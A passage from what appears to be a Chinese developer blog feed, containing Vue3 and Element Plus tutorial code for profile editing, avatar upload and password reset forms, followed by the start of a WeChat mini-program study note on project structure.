class="tag">&lt;<span class="name">el-input</span> <span class="attr">v-model</span>=<span class="string">"userInfo.nickname"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-input</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">"用户邮箱"</span> <span class="attr">prop</span>=<span class="string">"email"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">v-model</span>=<span class="string">"userInfo.email"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-input</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"primary"</span>&gt;</span>提交修改<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">el-form</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">el-col</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">el-row</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">page-container</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><h3 id="封装接口，更新个人信息"><a href="#封装接口，更新个人信息" class="headerlink" title="封装接口，更新个人信息"></a>封装接口，更新个人信息</h3><ol><li>封装接口</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">userUpdateInfoService</span> = (<span class="params">{ id, nickname, email }</span>) =&gt;</span><br><span class="line">  request.<span class="title function_">put</span>(<span class="string">'/my/userinfo'</span>, { id, nickname, email })</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>页面中校验后，封装调用</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> formRef = <span class="title function_">ref</span>()</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onSubmit</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="keyword">const</span> valid = <span class="keyword">await</span> formRef.<span class="property">value</span>.<span class="title function_">validate</span>()</span><br><span class="line">  <span class="keyword">if</span> (valid) {</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">userUpdateInfoService</span>(userInfo.<span class="property">value</span>)</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">getUser</span>()</span><br><span class="line">    <span class="title class_">ElMessage</span>.<span class="title function_">success</span>(<span class="string">'修改成功'</span>)</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="个人中心项目实战-更换头像"><a href="#个人中心项目实战-更换头像" class="headerlink" title="个人中心项目实战 - 更换头像"></a>个人中心项目实战 - 更换头像</h2><h3 id="静态结构"><a href="#静态结构" class="headerlink" title="静态结构"></a>静态结构</h3><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line"><span class="keyword">import</span> { ref } <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> { <span class="title class_">Plus</span>, <span class="title class_">Upload</span> } <span class="keyword">from</span> <span class="string">'@element-plus/icons-vue'</span></span><br><span class="line"><span class="keyword">import</span> { useUserStore } <span class="keyword">from</span> <span class="string">'@/stores'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> userStore = <span class="title function_">useUserStore</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> imgUrl = <span class="title function_">ref</span>(userStore.<span class="property">user</span>.<span class="property">user_pic</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onUploadFile</span> = (<span class="params">file</span>) =&gt; {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(file)</span><br><span class="line">}</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">page-container</span> <span class="attr">title</span>=<span class="string">"更换头像"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">el-row</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">el-col</span> <span class="attr">:span</span>=<span class="string">"12"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">el-upload</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">ref</span>=<span class="string">"uploadRef"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">class</span>=<span class="string">"avatar-uploader"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">:auto-upload</span>=<span class="string">"false"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">:show-file-list</span>=<span class="string">"false"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">:on-change</span>=<span class="string">"onUploadFile"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        &gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">img</span> <span class="attr">v-if</span>=<span class="string">"imgUrl"</span> <span class="attr">:src</span>=<span class="string">"imgUrl"</span> <span class="attr">class</span>=<span class="string">"avatar"</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">img</span> <span class="attr">v-else</span> <span class="attr">src</span>=<span class="string">"@/assets/avatar.jpg"</span> <span class="attr">width</span>=<span class="string">"278"</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">el-upload</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"primary"</span> <span class="attr">:icon</span>=<span class="string">"Plus"</span> <span class="attr">size</span>=<span class="string">"large"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          选择图片</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"success"</span> <span class="attr">:icon</span>=<span class="string">"Upload"</span> <span class="attr">size</span>=<span class="string">"large"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          上传头像</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">el-col</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">el-row</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">page-container</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">lang</span>=<span class="string">"scss"</span> <span class="attr">scoped</span>&gt;</span><span class="language-css"></span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"><span class="selector-class">.avatar-uploader</span> {</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">  :<span class="built_in">deep</span>() {</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="selector-class">.avatar</span> {</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">width</span>: <span class="number">278px</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">height</span>: <span class="number">278px</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">display</span>: block;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    }</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="selector-class">.el-upload</span> {</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">border</span>: <span class="number">1px</span> dashed <span class="built_in">var</span>(--el-border-color);</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">border-radius</span>: <span class="number">6px</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">cursor</span>: pointer;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">position</span>: relative;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">overflow</span>: hidden;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">transition</span>: <span class="built_in">var</span>(--el-transition-duration-fast);</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    }</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="selector-class">.el-upload</span><span class="selector-pseudo">:hover</span> {</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">border-color</span>: <span class="built_in">var</span>(--el-color-primary);</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    }</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    <span class="selector-class">.el-icon</span><span class="selector-class">.avatar-uploader-icon</span> {</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">font-size</span>: <span class="number">28px</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">color</span>: <span class="number">#8c939d</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">width</span>: <span class="number">278px</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">height</span>: <span class="number">278px</span>;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">      <span class="attribute">text-align</span>: center;</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">    }</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">  }</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml">}</span></span></span><br><span class="line"><span class="language-css"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><h3 id="选择预览图片"><a href="#选择预览图片" class="headerlink" title="选择预览图片"></a>选择预览图片</h3><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> uploadRef = <span class="title function_">ref</span>()</span><br><span class="line"><span class="keyword">const</span> imgUrl = <span class="title function_">ref</span>(userStore.<span class="property">user</span>.<span class="property">user_pic</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onUploadFile</span> = (<span class="params">file</span>) =&gt; {</span><br><span class="line">  <span class="keyword">const</span> reader = <span class="keyword">new</span> <span class="title class_">FileReader</span>()</span><br><span class="line">  reader.<span class="title function_">readAsDataURL</span>(file.<span class="property">raw</span>)</span><br><span class="line">  reader.<span class="property">onload</span> = <span class="function">() =&gt;</span> {</span><br><span class="line">    imgUrl.<span class="property">value</span> = reader.<span class="property">result</span></span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">&lt;el-upload ref=<span class="string">"uploadRef"</span>&gt;&lt;/el-upload&gt; </span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">el-button</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  @<span class="attr">click</span>=<span class="string">"uploadRef.$el.querySelector('input').click()"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  <span class="attr">type</span>=<span class="string">"primary"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  <span class="attr">:icon</span>=<span class="string">"Plus"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  <span class="attr">size</span>=<span class="string">"large"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  &gt;</span>选择图片&lt;/el-button</span></span><br><span class="line"><span class="language-xml">&gt;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="上传头像"><a href="#上传头像" class="headerlink" title="上传头像"></a>上传头像</h3><ol><li>封装接口</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">userUploadAvatarService</span> = (<span class="params">avatar</span>) =&gt; request.<span class="title function_">patch</span>(<span class="string">'/my/update/avatar'</span>, { avatar })</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>调用接口</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">onUpdateAvatar</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="keyword">await</span> <span class="title function_">userUploadAvatarService</span>(imgUrl.<span class="property">value</span>)</span><br><span class="line">  <span class="keyword">await</span> userStore.<span class="title function_">getUser</span>()</span><br><span class="line">  <span class="title class_">ElMessage</span>({ <span class="attr">type</span>: <span class="string">'success'</span>, <span class="attr">message</span>: <span class="string">'更换头像成功'</span> })</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="个人中心项目实战-重置密码"><a href="#个人中心项目实战-重置密码" class="headerlink" title="个人中心项目实战 - 重置密码"></a>个人中心项目实战 - 重置密码</h2><p>chatgpt  prompt</p><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">请基于 elementPlus 和 <span class="title class_">Vue3</span> 的语法，生成组件代码</span><br><span class="line">要求：</span><br><span class="line">一、表单结构要求</span><br><span class="line"><span class="number">1.</span> 组件中包含一个el-form表单，有四行内容，前三行是表单输入框，第四行是两个按钮</span><br><span class="line"><span class="number">2.</span> 第一行 label 原密码</span><br><span class="line"><span class="number">3.</span> 第二行 label 新密码</span><br><span class="line"><span class="number">4.</span> 第三行 label 确认密码</span><br><span class="line"><span class="number">5.</span> 第四行两个按钮，修改密码 和 重置</span><br><span class="line"></span><br><span class="line">二、form绑定字段如下：</span><br><span class="line"><span class="keyword">const</span> pwdForm = <span class="title function_">ref</span>({</span><br><span class="line">  <span class="attr">old_pwd</span>: <span class="string">''</span>,</span><br><span class="line">  <span class="attr">new_pwd</span>: <span class="string">''</span>,</span><br><span class="line">  <span class="attr">re_pwd</span>: <span class="string">''</span></span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">三、校验需求</span><br><span class="line">所有字段，都是 <span class="number">6</span>-<span class="number">15</span>位 非空</span><br><span class="line">自定义校验<span class="number">1</span>：原密码 和 新密码不能一样</span><br><span class="line">自定义校验<span class="number">2</span>：新密码 和 确认密码必须一样</span><br></pre></td></tr></tbody></table></figure><h3 id="静态结构-校验处理-1"><a href="#静态结构-校验处理-1" class="headerlink" title="静态结构 + 校验处理"></a>静态结构 + 校验处理</h3><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line"><span class="keyword">import</span> { ref } <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">const</span> pwdForm = <span class="title function_">ref</span>({</span><br><span class="line">  <span class="attr">old_pwd</span>: <span class="string">''</span>,</span><br><span class="line">  <span class="attr">new_pwd</span>: <span class="string">''</span>,</span><br><span class="line">  <span class="attr">re_pwd</span>: <span class="string">''</span></span><br><span class="line">})</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">checkOldSame</span> = (<span class="params">rule, value, cb</span>) =&gt; {</span><br><span class="line">  <span class="keyword">if</span> (value === pwdForm.<span class="property">value</span>.<span class="property">old_pwd</span>) {</span><br><span class="line">    <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">'原密码和新密码不能一样!'</span>))</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="title function_">cb</span>()</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">checkNewSame</span> = (<span class="params">rule, value, cb</span>) =&gt; {</span><br><span class="line">  <span class="keyword">if</span> (value !== pwdForm.<span class="property">value</span>.<span class="property">new_pwd</span>) {</span><br><span class="line">    <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">'新密码和确认再次输入的新密码不一样!'</span>))</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="title function_">cb</span>()</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"><span class="keyword">const</span> rules = {</span><br><span class="line">  <span class="comment">// 原密码</span></span><br><span class="line">  <span class="attr">old_pwd</span>: [</span><br><span class="line">    { <span class="attr">required</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">'请输入密码'</span>, <span class="attr">trigger</span>: <span class="string">'blur'</span> },</span><br><span class="line">    {</span><br><span class="line">      <span class="attr">pattern</span>: <span class="regexp">/^\S{6,15}$/</span>,</span><br><span class="line">      <span class="attr">message</span>: <span class="string">'密码长度必须是6-15位的非空字符串'</span>,</span><br><span class="line">      <span class="attr">trigger</span>: <span class="string">'blur'</span></span><br><span class="line">    }</span><br><span class="line">  ],</span><br><span class="line">  <span class="comment">// 新密码</span></span><br><span class="line">  <span class="attr">new_pwd</span>: [</span><br><span class="line">    { <span class="attr">required</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">'请输入新密码'</span>, <span class="attr">trigger</span>: <span class="string">'blur'</span> },</span><br><span class="line">    {</span><br><span class="line">      <span class="attr">pattern</span>: <span class="regexp">/^\S{6,15}$/</span>,</span><br><span class="line">      <span class="attr">message</span>: <span class="string">'密码长度必须是6-15位的非空字符串'</span>,</span><br><span class="line">      <span class="attr">trigger</span>: <span class="string">'blur'</span></span><br><span class="line">    },</span><br><span class="line">    { <span class="attr">validator</span>: checkOldSame, <span class="attr">trigger</span>: <span class="string">'blur'</span> }</span><br><span class="line">  ],</span><br><span class="line">  <span class="comment">// 确认新密码</span></span><br><span class="line">  <span class="attr">re_pwd</span>: [</span><br><span class="line">    { <span class="attr">required</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">'请再次确认新密码'</span>, <span class="attr">trigger</span>: <span class="string">'blur'</span> },</span><br><span class="line">    {</span><br><span class="line">      <span class="attr">pattern</span>: <span class="regexp">/^\S{6,15}$/</span>,</span><br><span class="line">      <span class="attr">message</span>: <span class="string">'密码长度必须是6-15位的非空字符串'</span>,</span><br><span class="line">      <span class="attr">trigger</span>: <span class="string">'blur'</span></span><br><span class="line">    },</span><br><span class="line">    { <span class="attr">validator</span>: checkNewSame, <span class="attr">trigger</span>: <span class="string">'blur'</span> }</span><br><span class="line">  ]</span><br><span class="line">}</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">page-container</span> <span class="attr">title</span>=<span class="string">"重置密码"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">el-row</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">el-col</span> <span class="attr">:span</span>=<span class="string">"12"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">el-form</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">:model</span>=<span class="string">"pwdForm"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">:rules</span>=<span class="string">"rules"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">ref</span>=<span class="string">"formRef"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">label-width</span>=<span class="string">"100px"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">size</span>=<span class="string">"large"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        &gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">"原密码"</span> <span class="attr">prop</span>=<span class="string">"old_pwd"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">v-model</span>=<span class="string">"pwdForm.old_pwd"</span> <span class="attr">type</span>=<span class="string">"password"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-input</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">"新密码"</span> <span class="attr">prop</span>=<span class="string">"new_pwd"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">v-model</span>=<span class="string">"pwdForm.new_pwd"</span> <span class="attr">type</span>=<span class="string">"password"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-input</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">"确认新密码"</span> <span class="attr">prop</span>=<span class="string">"re_pwd"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">v-model</span>=<span class="string">"pwdForm.re_pwd"</span> <span class="attr">type</span>=<span class="string">"password"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-input</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">el-button</span> @<span class="attr">click</span>=<span class="string">"onSubmit"</span> <span class="attr">type</span>=<span class="string">"primary"</span>&gt;</span>修改密码<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">el-button</span> @<span class="attr">click</span>=<span class="string">"onReset"</span>&gt;</span>重置<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">el-form</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">el-col</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">el-row</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">page-container</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><h3 id="封装接口，更新密码信息"><a href="#封装接口，更新密码信息" class="headerlink" title="封装接口，更新密码信息"></a>封装接口，更新密码信息</h3><ol><li>封装接口</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">userUpdatePassService</span> = (<span class="params">{ old_pwd, new_pwd, re_pwd }</span>) =&gt;</span><br><span class="line">  request.<span class="title function_">patch</span>(<span class="string">'/my/updatepwd'</span>, { old_pwd, new_pwd, re_pwd })</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>页面中调用</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> formRef = <span class="title function_">ref</span>()</span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">useRouter</span>()</span><br><span class="line"><span class="keyword">const</span> userStore = <span class="title function_">useUserStore</span>()</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onSubmit</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="keyword">const</span> valid = <span class="keyword">await</span> formRef.<span class="property">value</span>.<span class="title function_">validate</span>()</span><br><span class="line">  <span class="keyword">if</span> (valid) {</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">userUpdatePassService</span>(pwdForm.<span class="property">value</span>)</span><br><span class="line">    <span class="title class_">ElMessage</span>({ <span class="attr">type</span>: <span class="string">'success'</span>, <span class="attr">message</span>: <span class="string">'更换密码成功'</span> })</span><br><span class="line">    userStore.<span class="title function_">setToken</span>(<span class="string">''</span>)</span><br><span class="line">    userStore.<span class="title function_">setUser</span>({})</span><br><span class="line">    router.<span class="title function_">push</span>(<span class="string">'/login'</span>)</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onReset</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">  formRef.<span class="property">value</span>.<span class="title function_">resetFields</span>()</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 项目 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序学习笔记</title>
      <link href="/NANABLOG/2023/12/19/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/NANABLOG/2023/12/19/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><img src="/Blackcat-loveBlog/png/wechat.png"></p><h1 id="小程序简介"><a href="#小程序简介" class="headerlink" title="小程序简介"></a>小程序简介</h1><p>小程序是一种全新的连接用户与服务的方式，它可以在微信内被便捷地获取和传播，同时具有出色的使用体验。</p><p>官方文档:<a href="https://developers.weixin.qq.com/miniprogram/dev/framework/quickstart/">https://developers.weixin.qq.com/miniprogram/dev/framework/quickstart/</a></p><h2 id="项目构成"><a href="#项目构成" class="headerlink" title="项目构成"></a>项目构成</h2><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p>小程序包含一个描述整体程序的 <code>app</code> 和多个描述各自页面的 <code>page</code>。</p><p>一个小程序主体部分由三个文件组成，必须放在项目的根目录，如下：</p><table><thead><tr><th align="left">文件</th><th align="left">必需</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left"><a href="https://developers.weixin.qq.com/miniprogram/dev/framework/app-service/app.html">app.js</a></td><td align="left">是</td><td align="left">小程序逻辑</td></tr><tr><td align="left"><a href="https://developers.weixin.qq.com/miniprogram/dev/framework/config.html">app.json</a></td><td align="left">是</td><td align="left">小程序公共配置</td></tr><tr><td align="left"><a href="https://developers.weixin.qq.com/miniprogram/dev/framework/view/wxss.html">app.wxss</a></td><td align="left">否</td><td align="left">小程序公共样式表</td></tr></tbody></table><p>一个小程序页面由四个文件组成，分别是：</p><table><thead><tr><th align="left">文件类型</th><th align="left">必需</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left"><a href="https://developers.weixin.qq.com/miniprogram/dev/framework/app-service/page.html">js</a></td><td align="left">是</td><td align="left">页面逻辑</td></tr><tr><td align="left"><a href="https://developers.weixin.qq.com/miniprogram/dev/framework/view/wxml/">wxml</a></td><td align="left">是</td><td align="left">页面结构</td></tr><tr><td align="left"><a href="https://developers.weixin.qq.com/miniprogram/dev/framework/config.html#%E9%A1%B5%E9%9D%A2%E9%85%8D%E7%BD%AE">json</a></td><td align="left">否</td><td align="left">页面配置</td></tr><tr><td align="left"><a href="https://developers.weixin.qq.com/miniprogram/dev/framework/view/wxss.html">wxss</a></td><td align="left">否</td><td align="left">页面样式表</td></tr></tbody></table><p><strong>注意：为了方便开发者减少配置项，描述页面的四个文件必须具有相同的路径与文件名。</strong></p><p>微信小程序的项目目录构成主要包括以下几个部分：</p><ol><li><code>pages</code> 文件夹：主要存放小程序的页面文件。每个页面包含四个文件：<ul><li><code>index.js</code>：小程序的逻辑文件，也称事件交互文件和脚本文件，用于处理界面的点击事件等功能。</li><li><code>index.wxml</code>：界面文件，是页面结构文件，用于构建页面，在页面上增加控件，相当于HTML。</li><li><code>index.wxss</code>：样式表文件，类似于前端中的CSS，是为<code>index.wxml</code>文件和<code>page</code>文件进行美化的文件，让界面显示的更加美观。</li><li><code>index.json</code>：配置当前页面的默认项，主要是JSON数据格式存放，用于设置程序的配置效果。</li></ul></li><li><code>utils</code> 文件夹：存放一些辅助函数或工具类。</li><li><code>app.js</code> 文件：小程序的全局配置文件，包括全局变量、函数、生命周期函数等。</li></ol><p>以下是微信小程序项目目录树的一个示例：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">/my_wechat_app  </span><br><span class="line">|-- pages/  </span><br><span class="line">|   |-- index/  </span><br><span class="line">|   |   |-- index.js  </span><br><span class="line">|   |   |-- index.wxml  </span><br><span class="line">|   |   |-- index.wxss  </span><br><span class="line">|   |   |-- index.json  </span><br><span class="line">|-- utils/  